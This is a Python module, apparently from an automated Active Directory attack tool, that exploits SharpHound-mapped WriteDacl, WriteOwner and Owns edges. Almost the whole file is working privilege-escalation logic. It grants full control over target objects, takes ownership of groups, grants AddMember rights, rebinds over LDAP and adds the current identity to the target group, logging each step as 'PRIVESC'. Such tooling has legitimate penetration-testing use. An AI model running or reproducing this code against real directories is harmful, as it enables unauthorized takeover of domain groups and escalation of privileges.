"""Compatibility handlers for structural SharpHound edges."""

import logging

from core.logger import logger

from .shared import PrivescActions


class StructuralModule:
    def __init__(self, engine):
        self.engine = engine
        self.actions = PrivescActions(engine)

    # WriteDacl / WriteOwner / Owns are structural privilege abuse.
    def execute(self, rel, context) -> bool:
        # Abuses WriteDacl on the target object by adding full control for the current identity.
        # Abuses WriteOwner / Owns on groups by granting AddMember to the current identity,
        # switching context to that foothold identity, then adding it to the target group.
        start_node, end_node = self.actions.get_edge_nodes(rel)
        target = end_node.get("distinguishedname") or end_node.get("name") or start_node.get("distinguishedname") or start_node.get("name")
        if not target:
            logging.error(f"STRUCTURAL: could not resolve target for {rel.type}.")
            return False

        target_dn = target if str(target).upper().startswith("CN=") else self.actions.resolve_distinguished_name(target)
        if not target_dn:
            logging.error(f"STRUCTURAL: could not resolve DN for {rel.type}.")
            return False

        current_auth = context.get_current_auth()
        current_identity = current_auth.get("username")
        current_sid = self.actions.get_object_sid(current_identity)
        if not current_sid:
            logging.error(f"STRUCTURAL: could not resolve SID for current identity on {rel.type}.")
            return False

        target_label = str(end_node.get("name") or target_dn or target)
        display_target = target_label.replace("_", " ")
        display_user = str(current_identity or "the current user")
        owner_sid = self.actions.get_owner_sid(target_dn)
        logger.info(
            "PRIVESC",
            "privesc.group_addmember.grant.preflight",
            f"Preflight for AddMember on {display_target} as {display_user}",
            source="web.app",
            details={
                "target_dn": target_dn,
                "member": display_user,
                "action": "AddMember",
                "current_sid": current_sid,
                "owner_sid": owner_sid,
                "owner_matches_current": bool(owner_sid and str(owner_sid).lower() == str(current_sid).lower()),
            },
        )

        if rel.type == "WriteDacl":
            return self.actions.grant_full_control(target_dn, current_sid)

        if rel.type in ("WriteOwner", "Owns"):
            takeover_message = f"Taking ownership of {display_target} as {display_user}."
            logging.info(takeover_message)
            logger.info(
                "PRIVESC",
                "privesc.group_addmember.owner.started",
                takeover_message,
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "WriteOwner", "current_sid": current_sid, "owner_sid": owner_sid},
            )
            if not self.actions.set_owner(target_dn, current_sid):
                failure_message = f"Failed to take ownership of {display_target} before granting AddMember."
                logging.error(failure_message)
                logger.error(
                    "PRIVESC",
                    "privesc.group_addmember.owner.failed",
                    failure_message,
                    source="web.app",
                    details={
                        "target_dn": target_dn,
                        "member": display_user,
                        "action": "WriteOwner",
                        "ldap_result": getattr(self.actions.conn, "result", {}),
                        "diagnostic": getattr(self.actions, "last_grant_diagnostic", None) or getattr(self.actions, "last_group_member_message", None),
                    },
                )
                return False
            logger.info(
                "PRIVESC",
                "privesc.group_addmember.owner.success",
                f"Ownership of {display_target} transferred to {display_user}.",
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "WriteOwner"},
            )

            grant_started = f"Granting AddMember on {display_target} for {display_user}."
            logging.info(grant_started)
            logger.info(
                "PRIVESC",
                "privesc.group_addmember.grant.started",
                grant_started,
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "AddMember"},
            )

            if not self.actions.grant_group_addmember(target_dn, current_sid):
                failure_message = f"Failed to grant AddMember on {display_target}."
                logging.error(failure_message)
                logger.error(
                    "PRIVESC",
                    "privesc.group_addmember.grant.failed",
                    failure_message,
                    source="web.app",
                    details={
                        "target_dn": target_dn,
                        "member": display_user,
                        "action": "AddMember",
                        "ldap_result": getattr(self.actions.conn, "result", {}),
                        "diagnostic": getattr(self.actions, "last_grant_diagnostic", None) or getattr(self.actions, "last_group_member_message", None),
                    },
                )
                return False

            logger.info(
                "PRIVESC",
                "privesc.group_addmember.grant.success",
                f"Granted AddMember on {display_target} for {display_user}.",
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "AddMember"},
            )

            if not context.switch_identity(current_identity):
                failure_message = f"The context could not switch to the {display_user} identity after the grant."
                logging.error(failure_message)
                logger.error(
                    "PRIVESC",
                    "privesc.group_addmember.grant.failed",
                    failure_message,
                    source="web.app",
                    details={"target_dn": target_dn, "member": display_user, "action": "AddMember", "diagnostic": "Context switch failed after AddMember grant."},
                )
                return False

            if not self.engine.conn.rebind(user=current_identity, password=current_auth.get("value") or ""):
                failure_message = f"LDAP rebind failed for the {display_user} identity after the AddMember grant."
                logging.error(failure_message)
                logger.error(
                    "PRIVESC",
                    "privesc.group_addmember.grant.failed",
                    failure_message,
                    source="web.app",
                    details={"target_dn": target_dn, "member": display_user, "action": "AddMember", "diagnostic": "LDAP rebind failed after AddMember grant."},
                )
                return False

            add_started = f"Adding {display_user} into {display_target} group."
            logging.info(add_started)
            logger.info(
                "PRIVESC",
                "privesc.add_group_member.started",
                add_started,
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "AddMember"},
            )

            success = self.actions.add_group_member(target_dn, current_identity)
            if not success:
                failure_message = f"Failed to add {display_user} to {display_target} group."
                logging.error(failure_message)
                logger.error(
                    "PRIVESC",
                    "privesc.add_group_member.failed",
                    failure_message,
                    source="web.app",
                    details={
                        "target_dn": target_dn,
                        "member": display_user,
                        "action": "AddMember",
                        "ldap_result": getattr(self.actions.conn, "result", {}),
                        "diagnostic": getattr(self.actions, "last_group_member_message", None) or getattr(self.actions, "last_grant_diagnostic", None),
                    },
                )
                return False

            success_message = f"Successfully added {display_user} to {display_target} group."
            context_message = f"Context changed to user {display_user} successfully."
            logging.info(success_message)
            logging.info(context_message)
            logger.info(
                "PRIVESC",
                "privesc.add_group_member.success",
                success_message,
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "AddMember"},
            )
            logger.info(
                "PRIVESC",
                "privesc.context.switched",
                context_message,
                source="web.app",
                details={"target_dn": target_dn, "member": display_user, "action": "ContextSwitch"},
            )
            return True

        logging.info(f"STRUCTURAL: {rel.type} -> {target_dn}; no direct exploit mapped yet.")
        return True
